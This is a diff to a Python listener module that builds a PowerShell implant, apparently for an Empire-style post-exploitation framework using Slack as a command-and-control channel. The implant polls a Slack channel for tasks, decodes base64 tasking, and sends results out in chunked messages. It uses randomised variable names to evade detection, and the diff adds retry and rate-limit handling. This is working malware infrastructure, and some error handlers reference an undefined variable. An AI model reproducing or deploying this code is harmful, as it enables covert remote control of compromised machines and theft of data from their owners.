@@ -447,24 +447,24 @@ class Listener:
 
                         write-host '[*] Getting tasks'
 
-                        try {
-                            $waiting = $false
-                            $APIToken = '"""+ api_token +"""'
-                            $Channel = '"""+ channel_id +"""'
-                            $AgentID = '"""+ agent_id +"""'
+                        $waiting = $false
+                        $APIToken = '"""+ api_token +"""'
+                        $Channel = '"""+ channel_id +"""'
+                        $AgentID = '"""+ agent_id +"""'
 
-                            # build the web request object
-                            $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
+                        # build the web request object
+                        $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
 
-                            # set the proxy settings for the WC to be the default system settings
-                            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                            if($Script:Proxy) {
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
-                            }
+                        # set the proxy settings for the WC to be the default system settings
+                        $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                        $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                        if($Script:Proxy) {
+                            $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
+                        }
 
-                            # Look for reply to previous tasking message
-                            if($Script:TaskingTracker.TaskTS) {
+                        # Look for reply to previous tasking message
+                        if($Script:TaskingTracker.TaskTS) {
+                            try {
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
                                 $slack_response2=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($Script:TaskingTracker.TaskTS)")
                                 $slack_response=ConvertFrom-Json20 $slack_response2;
@@ -479,9 +479,9 @@ class Listener:
                                     $data_response=ConvertFrom-Json20 $data_response;
 
                                     $raw_base64 = (($data_response['messages'] | %{ $_["text"] }) -join '').Replace('-MESSAGE_END-','')
-                                    
+
                                     write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
-                                    
+
                                     $result=Decode-Base64 $raw_base64;
                                     $result
                                 }
@@ -489,36 +489,54 @@ class Listener:
                                     $waiting = $true
                                 }
                             }
-
-                            if($waiting -eq $false) {
-                                # meta 'TASKING_REQUEST' : 4
-                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
-                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
-
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
-                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
-
-                                $RoutingPacket_base64 = [Convert]::ToBase64String($RoutingPacket)
-
-                                try {
-                                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
-                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$([System.Net.WebUtility]::UrlEncode($RoutingPacket_base64))&username=$($AgentID):STAGED")
-
-                                    # grab the timestamp from the sent message so we can track a response
-                                    $slack_response = ConvertFrom-Json20 $response
-                                    $Script:TaskingTracker.TaskTS = $slack_response["ts"]
-
+                            catch [System.Net.WebException] {
+                                get-winhomelocation
+                                Write-Host "Checking response, $_";
+                                if($_.Exception.InnerException.Response.StatusCode.value__ -eq 429) {
+                                    $secs = $_.Exception.InnerException.Response.Headers.Get("Retry-After")*2
+                                    Write-Host "Waiting $secs seconds... (reading reply)";
+                                    Start-Sleep -Seconds $secs;
                                 }
-                                catch [System.Net.WebException]{$null}
-                            }
+                                #Try again and hope for the best
+                                else {
+                                    Start-Sleep -Seconds 5;
+                                }
+                            };
                         }
-                        catch [Net.WebException] {
-                            write-host $_
-                            $script:MissedCheckins += 1
-                            #if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-                                # restart key negotiation
-                            #    Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                            #}
+
+                        if($waiting -eq $false) {
+                            Write-Host "Posting new request"
+                            # meta 'TASKING_REQUEST' : 4
+                            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
+                            $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
+
+                            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
+                            $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+
+                            $RoutingPacket_base64 = [Convert]::ToBase64String($RoutingPacket)
+
+                            try {
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
+                                $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$([System.Net.WebUtility]::UrlEncode($RoutingPacket_base64))&username=$($AgentID):STAGED")
+
+                                # grab the timestamp from the sent message so we can track a response
+                                $slack_response = ConvertFrom-Json20 $response
+                                $Script:TaskingTracker.TaskTS = $slack_response["ts"]
+
+                            }
+                            catch [System.Net.WebException] {
+                                get-winhomelocation
+                                write-host "Requesting task, $_"
+                                if($e.Exception.InnerException.Response.StatusCode.value__ -eq 429) {
+                                    $secs = $e.Exception.InnerException.Response.Headers.Get("Retry-After")*2
+                                    Write-Host "Waiting $secs seconds... (post request)";
+                                    Start-Sleep -Seconds $secs;
+                                }
+                                #Try again and hope for the best
+                                else {
+                                    Start-Sleep -Seconds 5;
+                                }
+                            };
                         }
                     }
                 """
@@ -563,22 +581,52 @@ class Listener:
 
                                 # send the parts
                                 foreach($part in $Parts_to_send) {
-                                    $part = $([System.Net.WebUtility]::UrlEncode($part))
-                                    
-                                    $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
-                                    $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$($part)&username=$($AgentID):STAGED&thread_ts=$thread_ts")
-                                    Start-Sleep 1
-
+                                    # Logic to retry sending messages until it succeeds
+                                    $success = $false
+                                    $failures = 0
+                                    while(!($success)) {
+                                        try {
+                                            $part = $([System.Net.WebUtility]::UrlEncode($part))
+                                            $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
+                                            $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$($part)&username=$($AgentID):STAGED&thread_ts=$thread_ts")
+                                            Start-Sleep 1
+                                            $failures = 0
+                                            $success = $true
+                                        }
+                                        catch [System.Net.WebException] {
+                                            $failures += 1
+                                            Write-Host "Posting single message $_";
+                                            if($_.Exception.InnerException.Response.StatusCode.value__ -eq 429) {
+                                                $secs = $_.Exception.InnerException.Response.Headers.Get("Retry-After")*2*($failures)
+                                                Write-Host "Waiting $secs seconds... (in payload loop)";
+                                                Start-Sleep -Seconds $secs;
+                                            }
+                                            #Try again and hope for the best
+                                            else {
+                                                Start-Sleep -Seconds 5;
+                                            }
+                                        }
+                                    }
                                 }
-                                
 
                                 # send the finish
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
                                 $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=--MESSAGE_END--&username=$($AgentID):STAGED&thread_ts=$thread_ts")
 
-
                             }
-                            catch [System.Net.WebException]{$null}
+                            catch [System.Net.WebException] {
+                                Write-Host "Posting all data $_";
+                                if($_.Exception.InnerException.Response.StatusCode.value__ -eq 429) {
+                                    $secs = $_.Exception.InnerException.Response.Headers.Get("Retry-After")*4
+                                    Write-Host "Waiting $secs seconds... (in header send)";
+                                    Start-Sleep -Seconds $secs;
+                                }
+                                #Try again and hope for the best
+                                else {
+                                    Start-Sleep -Seconds 10;
+                                }
+                                (& $sendmessage -packets $packets)
+                            };
                         }
                     }
                 """
